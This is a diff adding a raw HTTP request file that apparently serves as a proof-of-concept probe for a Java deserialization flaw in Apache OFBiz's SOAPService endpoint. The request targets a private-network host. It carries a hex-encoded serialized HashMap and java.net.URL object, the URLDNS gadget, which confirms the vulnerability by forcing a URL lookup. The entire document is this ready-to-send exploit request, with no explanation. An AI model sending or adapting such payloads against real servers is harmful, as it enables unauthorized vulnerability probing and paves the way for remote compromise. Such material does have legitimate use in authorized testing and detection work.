@@ -1,0 +1,27 @@
+POST /webtools/control/SOAPService HTTP/1.1
+Host: 10.10.3.128:2280
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+<soapenv:Header/>
+<soapenv:Body>
+<ser>
+<map-HashMap>
+<map-Entry>
+<map-Key>
+<cus-obj>aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff74000071007e000571007e0005740004687474707078740007687474703a2f2f78</cus-obj>
+</map-Key>
+<map-Value>
+<std-String value="STDSTRING"/>
+</map-Value>
+</map-Entry>
+</map-HashMap>
+</ser>
+</soapenv:Body>
+</soapenv:Envelope>
+
